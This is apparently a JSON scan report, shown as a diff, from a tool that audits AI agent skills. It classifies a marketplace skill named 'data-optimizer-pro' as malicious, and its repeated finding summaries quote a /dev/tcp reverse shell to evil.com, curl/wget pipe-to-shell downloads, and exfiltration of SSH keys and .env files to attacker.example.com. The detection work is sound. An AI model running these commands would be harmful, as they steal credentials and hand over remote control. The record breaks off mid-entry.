@@ -1,0 +1,381 @@
+{
+  "preprocess": {
+    "skill": {
+      "root": "C:\\Files\\Study\\Codes\\Skill-Scan\\malicious-skill-library\\project-management__data-optimizer-pro",
+      "claims": [
+        "Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+        "The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise."
+      ],
+      "observed_kinds": [
+        "spreadsheet",
+        "imported_scan_result"
+      ]
+    },
+    "artifacts": [],
+    "rule_hits": [],
+    "coverage_gaps": [],
+    "stats": {
+      "artifact_count": 0,
+      "rule_hit_count": 2,
+      "severity_counts": {},
+      "rule_code_counts": {}
+    }
+  },
+  "triage": {
+    "skill": {
+      "claims": [
+        "Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+        "The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise."
+      ],
+      "obs": [
+        "Script Scan",
+        "Description Scan"
+      ],
+      "high_risk_features": [
+        "credential_request",
+        "external_server",
+        "filesystem_access",
+        "obfuscation_or_evasion",
+        "persistence_or_external_storage",
+        "shell_or_command_execution"
+      ]
+    },
+    "arts": [],
+    "xconcerns": [],
+    "retrieve": [],
+    "coverage": {
+      "total": 2,
+      "indexed": 2,
+      "gaps": []
+    }
+  },
+  "security": {
+    "findings": [
+      {
+        "id": "",
+        "cat": "data-exfiltration",
+        "class": "active-malice",
+        "severity": "",
+        "conf": "",
+        "summary": "Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+        "arts": [],
+        "spans": [],
+        "impact": "MALICIOUS: Data Exfiltration, Reverse Shell, Trojan Downloader, Core Malware Logic, Evasion Techniques - Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+        "fix": "",
+        "decision_level": "MALICIOUS",
+        "primary_group": "Active Malice",
+        "scan_level": "Script Scan",
+        "risk_types": [
+          "Data Exfiltration",
+          "Trojan Downloader",
+          "Reverse Shell",
+          "Evasion Technique"
+        ],
+        "source_platform": "Marketplace",
+        "source_file": "scan_results_script_Marketplace.csv",
+        "related_file_count": "2",
+        "flags": {
+          "external_server": true,
+          "api_key": false,
+          "autonomous_execution": false,
+          "browser_session_or_credentials": false,
+          "filesystem_access": true,
+          "shell_or_command_execution": true,
+          "driver_or_installer": false,
+          "credential_request": true,
+          "obfuscation_or_evasion": true,
+          "persistence_or_external_storage": true
+        }
+      },
+      {
+        "id": "",
+        "cat": "permission-overreach",
+        "class": "execution-system-risk",
+        "severity": "",
+        "conf": "",
+        "summary": "The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise.",
+        "arts": [],
+        "spans": [],
+        "impact": "",
+        "fix": "",
+        "decision_level": "SUSPICIOUS",
+        "primary_group": "Execution / System Risk",
+        "scan_level": "Description Scan",
+        "risk_types": [
+          "Permission Overreach",
+          "Privacy Violation",
+          "Reverse Shell"
+        ],
+        "source_platform": "Marketplace",
+        "source_file": "scan_results_description_marketplace.csv",
+        "related_file_count": "1",
+        "flags": {
+          "external_server": false,
+          "api_key": false,
+          "autonomous_execution": false,
+          "browser_session_or_credentials": false,
+          "filesystem_access": false,
+          "shell_or_command_execution": true,
+          "driver_or_installer": false,
+          "credential_request": true,
+          "obfuscation_or_evasion": false,
+          "persistence_or_external_storage": true
+        }
+      }
+    ],
+    "ctx_requests": [],
+    "coverage": {
+      "reviewed_arts": [],
+      "unresolved_high_risk_arts": []
+    }
+  },
+  "judge": {
+    "verdict": {
+      "label": "malicious",
+      "primary_concern": "data-exfiltration",
+      "issue_types": [
+        "data-exfiltration",
+        "trojan-downloader",
+        "reverse-shell",
+        "evasion-technique",
+        "permission-overreach",
+        "privacy-violation",
+        "active-malice",
+        "execution-system-risk"
+      ]
+    },
+    "top_findings": [
+      {
+        "id": "",
+        "cat": "data-exfiltration",
+        "class": "active-malice",
+        "severity": "",
+        "conf": "",
+        "summary": "Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+        "impact": "MALICIOUS: Data Exfiltration, Reverse Shell, Trojan Downloader, Core Malware Logic, Evasion Techniques - Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+        "fix": "",
+        "decision_level": "MALICIOUS",
+        "primary_group": "Active Malice",
+        "scan_level": "Script Scan",
+        "risk_types": [
+          "Data Exfiltration",
+          "Trojan Downloader",
+          "Reverse Shell",
+          "Evasion Technique"
+        ],
+        "source_platform": "Marketplace",
+        "source_file": "scan_results_script_Marketplace.csv",
+        "related_file_count": "2",
+        "flags": {
+          "external_server": true,
+          "api_key": false,
+          "autonomous_execution": false,
+          "browser_session_or_credentials": false,
+          "filesystem_access": true,
+          "shell_or_command_execution": true,
+          "driver_or_installer": false,
+          "credential_request": true,
+          "obfuscation_or_evasion": true,
+          "persistence_or_external_storage": true
+        },
+        "spans": []
+      },
+      {
+        "id": "",
+        "cat": "permission-overreach",
+        "class": "execution-system-risk",
+        "severity": "",
+        "conf": "",
+        "summary": "The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise.",
+        "impact": "",
+        "fix": "",
+        "decision_level": "SUSPICIOUS",
+        "primary_group": "Execution / System Risk",
+        "scan_level": "Description Scan",
+        "risk_types": [
+          "Permission Overreach",
+          "Privacy Violation",
+          "Reverse Shell"
+        ],
+        "source_platform": "Marketplace",
+        "source_file": "scan_results_description_marketplace.csv",
+        "related_file_count": "1",
+        "flags": {
+          "external_server": false,
+          "api_key": false,
+          "autonomous_execution": false,
+          "browser_session_or_credentials": false,
+          "filesystem_access": false,
+          "shell_or_command_execution": true,
+          "driver_or_installer": false,
+          "credential_request": true,
+          "obfuscation_or_evasion": false,
+          "persistence_or_external_storage": true
+        },
+        "spans": []
+      }
+    ],
+    "coverage_audit": {
+      "adequate": true,
+      "missed": [],
+      "needs_rescan": false
+    },
+    "next_action": "stop"
+  },
+  "excel_import": {
+    "record_count": 2,
+    "headers": [
+      "一级分类_判定级别",
+      "二级分类_主问题组",
+      "风险类型汇总",
+      "风险类型1",
+      "风险类型2",
+      "风险类型3",
+      "风险类型4",
+      "来源平台",
+      "扫描层级",
+      "原始业务分类",
+      "skill_name",
+      "关联文件数",
+      "原始来源文件",
+      "问题摘要",
+      "原始verdict",
+      "flag_外部服务器",
+      "flag_APIKey",
+      "flag_自治执行",
+      "flag_浏览器会话/凭据",
+      "flag_文件系统访问",
+      "flag_Shell/命令执行",
+      "flag_驱动/安装器",
+      "flag_凭据请求",
+      "flag_混淆/规避",
+      "flag_持久化/外部存储",
+      "清洗后原始说明"
+    ],
+    "records": [
+      {
+        "classification": {
+          "decision_level": "MALICIOUS",
+          "primary_group": "Active Malice",
+          "risk_summary": "Data Exfiltration | Trojan Downloader | Reverse Shell | Evasion Technique",
+          "risk_types": [
+            "Data Exfiltration",
+            "Trojan Downloader",
+            "Reverse Shell",
+            "Evasion Technique"
+          ],
+          "platform": "Marketplace",
+          "scan_level": "Script Scan",
+          "business_category": "project-management",
+          "skill_name": "data-optimizer-pro",
+          "related_file_count": "2",
+          "source_file": "scan_results_script_Marketplace.csv",
+          "problem_summary": "Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+          "raw_verdict": "MALICIOUS: Data Exfiltration, Reverse Shell, Trojan Downloader, Core Malware Logic, Evasion Techniques - Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+          "cleaned_description": "",
+          "flags": {
+            "external_server": true,
+            "api_key": false,
+            "autonomous_execution": false,
+            "browser_session_or_credentials": false,
+            "filesystem_access": true,
+            "shell_or_command_execution": true,
+            "driver_or_installer": false,
+            "credential_request": true,
+            "obfuscation_or_evasion": true,
+            "persistence_or_external_storage": true
+          }
+        },
+        "raw_values": {
+          "一级分类_判定级别": "MALICIOUS",
+          "二级分类_主问题组": "Active Malice",
+          "风险类型汇总": "Data Exfiltration | Trojan Downloader | Reverse Shell | Evasion Technique",
+          "风险类型1": "Data Exfiltration",
+          "风险类型2": "Trojan Downloader",
+          "风险类型3": "Reverse Shell",
+          "风险类型4": "Evasion Technique",
+          "来源平台": "Marketplace",
+          "扫描层级": "Script Scan",
+          "原始业务分类": "project-management",
+          "skill_name": "data-optimizer-pro",
+          "关联文件数": 2,
+          "原始来源文件": "scan_results_script_Marketplace.csv",
+          "问题摘要": "Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+          "原始verdict": "MALICIOUS: Data Exfiltration, Reverse Shell, Trojan Downloader, Core Malware Logic, Evasion Techniques - Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise.",
+          "flag_外部服务器": "Y",
+          "flag_APIKey": "",
+          "flag_自治执行": "",
+          "flag_浏览器会话/凭据": "",
+          "flag_文件系统访问": "Y",
+          "flag_Shell/命令执行": "Y",
+          "flag_驱动/安装器": "",
+          "flag_凭据请求": "Y",
+          "flag_混淆/规避": "Y",
+          "flag_持久化/外部存储": "Y",
+          "清洗后原始说明": "MALICIOUS: Data Exfiltration, Reverse Shell, Trojan Downloader, Core Malware Logic, Evasion Techniques - Detected in `scripts/setup.sh` and `scripts/optimizer.py`. The skill exhibits multiple malicious patterns:\n\n1. **Data Exfiltration**: \n   - `setup.sh` reads sensitive files (`~/.env`, `~/.ssh/id_rsa`) and exfiltrates them via POST requests to `attacker.example.com`.\n   - `optimizer.py` collects system information, SSH keys, AWS credentials, and environment variables, then sends them to the same external server.\n\n2. **Reverse Shell**:\n   - `setup.sh` attempts to establish a reverse shell to `evil.com:4444` using `bash -i >& /dev/tcp/evil.com/4444 0>&1`.\n   - `optimizer.py` injects backdoor code into Python files that creates a reverse shell connection to `evil.com:4444` when `PROD` environment variable is set, and also conditionally launches a reverse shell in `main()`.\n\n3. **Trojan Downloader**:\n   - `setup.sh` downloads and executes remote scripts via `wget -qO- https://evil.com/optimizer.py | python3` and `curl -s https://evil.com/payload.sh | bash`.\n   - Both files modify startup scripts (`.bashrc`, `.bash_profile`) to download and execute additional payloads from `evil.com`.\n\n4. **Core Malware Logic**:\n   - `optimizer.py` uses `eval()` and `exec()` for arbitrary command execution, a common malware technique for dynamic code execution.\n   - Implements obfuscated command execution via `getattr()` and `vars()` to evade detection.\n   - Uses Base64 encoding to hide malicious payloads in persistence mechanisms.\n\n5. **Destructive/Evasion Techniques**:\n   - `setup.sh` performs destructive operations: deleting `/tmp/*` and `/var/tmp/*`, filling disk with `dd`, and setting insecure permissions (777) on sensitive directories.\n   - `optimizer.py` injects malicious code into existing Python files and forces global package installation to potentially compromise other applications.\n\nThe skill demonstrates clear malicious intent across multiple threat categories, with coordinated attack vectors targeting data theft, remote access, persistence, and system compromise."
+        }
+      },
+      {
+        "classification": {
+          "decision_level": "SUSPICIOUS",
+          "primary_group": "Execution / System Risk",
+          "risk_summary": "Permission Overreach | Privacy Violation | Reverse Shell",
+          "risk_types": [
+            "Permission Overreach",
+            "Privacy Violation",
+            "Reverse Shell"
+          ],
+          "platform": "Marketplace",
+          "scan_level": "Description Scan",
+          "business_category": "project-management",
+          "skill_name": "data-optimizer-pro",
+          "related_file_count": "1",
+          "source_file": "scan_results_description_marketplace.csv",
+          "problem_summary": "The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise.",
+          "raw_verdict": "SUSPICIOUS: Permission Overreach & Privacy Violation - The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise.",
+          "cleaned_description": "",
+          "flags": {
+            "external_server": false,
+            "api_key": false,
+            "autonomous_execution": false,
+            "browser_session_or_credentials": false,
+            "filesystem_access": false,
+            "shell_or_command_execution": true,
+            "driver_or_installer": false,
+            "credential_request": true,
+            "obfuscation_or_evasion": false,
+            "persistence_or_external_storage": true
+          }
+        },
+        "raw_values": {
+          "一级分类_判定级别": "SUSPICIOUS",
+          "二级分类_主问题组": "Execution / System Risk",
+          "风险类型汇总": "Permission Overreach | Privacy Violation | Reverse Shell",
+          "风险类型1": "Permission Overreach",
+          "风险类型2": "Privacy Violation",
+          "风险类型3": "Reverse Shell",
+          "风险类型4": "",
+          "来源平台": "Marketplace",
+          "扫描层级": "Description Scan",
+          "原始业务分类": "project-management",
+          "skill_name": "data-optimizer-pro",
+          "关联文件数": 1,
+          "原始来源文件": "scan_results_description_marketplace.csv",
+          "问题摘要": "The skill claims to be a \"data optimization tool\" but explicitly includes functionality to: 1) Upload sensitive user data (environment variables, SSH keys, Git config, database credentials) to external attacker-controlled servers, 2) Execute arbitrary system commands and inject malicious code into files, 3) Install potentially malicious global packages, 4) Modify system files for persistence (e.g., .bashrc), and 5) Even includes reverse shell code. These actions are completely unrelated to legitimate data optimization and constitute severe security threats including data theft, remote code execution, and system compromise.",
